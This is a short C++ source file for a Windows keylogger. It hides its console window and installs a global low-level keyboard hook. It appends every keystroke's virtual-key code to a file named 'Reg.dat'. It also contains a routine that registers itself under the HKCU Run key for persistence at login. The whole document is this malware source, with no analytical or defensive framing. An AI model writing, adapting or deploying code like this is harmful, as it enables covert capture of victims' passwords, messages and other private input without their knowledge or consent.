#include <Windows.h>
#include <Winuser.h>
#include <fstream>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    std::string filename = "Reg.dat";
    std::ofstream outFile(filename, std::ios::app);
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        PKBDLLHOOKSTRUCT pKeyStruct = (PKBDLLHOOKSTRUCT)lParam;
        DWORD vkCode = pKeyStruct->vkCode;
        outFile << vkCode << " ";
    }
    outFile.close();
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void AutoRun()
{
    char arr[MAX_PATH] = { };
    GetModuleFileName(NULL, (LPWSTR)arr, MAX_PATH);

    HKEY hKey;

    if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        if (RegSetValueEx(hKey, L"My program", NULL, REG_SZ, (LPBYTE)arr, sizeof(arr)+1) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
        }
        return;
    }
}

int main()
{
    HWND consoleWindow = GetConsoleWindow();
    if (consoleWindow != NULL) ShowWindow(consoleWindow, SW_HIDE);
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (msg.message == WM_QUIT) break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
